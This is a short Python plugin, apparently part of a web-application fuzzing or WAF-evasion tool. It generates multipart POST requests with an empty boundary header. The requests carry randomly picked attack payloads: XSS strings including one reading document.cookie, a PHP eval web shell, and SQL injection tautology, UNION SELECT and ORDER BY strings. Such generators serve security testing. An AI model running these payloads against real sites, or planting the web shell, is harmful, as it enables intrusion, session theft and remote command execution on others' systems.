import random
from module import common
import string
from urllib.parse import unquote, quote


class none_boundary:
    common = None
    payloads = []

    def __init__(self, common=None):
        if (common != None):
            self.common = common

    def generate_payload(self, amount):
        general_payload = ''''<script>alert(NUM)</script>
        <img src=1 onerror=prompt(STR)>
        <svg/onload=alert(document.cookie)>
        <?php eval($_POST['cmd'])?>
        admin' or 'STR'='STR'''
        payload_templates = [x.strip() for x in general_payload.split('\n')]
        payload_templates.append('''' union select {}#'''.format(",".join([random.choice(['NUM',"'STR'"]) for _ in range(random.randint(1,6))])))
        payload_templates.append('''1 order by {}--+-'''.format(random.randint(2,22)))

        for _ in range(amount):
            payload = random.choice(payload_templates)
            payload = self.common.replace(payload,'NUM',6)
            payload = self.common.replace(payload,'STR',6)
            # 为了兼容其他插件，此处要前置\r\n
            self.payloads.append("\r\n\r\n" + payload)

    def generate_packages(self, amount):
        self.generate_payload(amount)
        self.common.multipart_exp = ''
        self.common.content_type_exp = 'Content-Type: multipart/form-data; boundary='
        packages = [self.common.generate(self.payloads[i],
                                         method="POST",
                                         payload_location='body_parame',
                                         encoding='multipart') for i in range(amount)]
        self.common.multipart_exp = None
        self.common.content_type_exp = None
        return packages
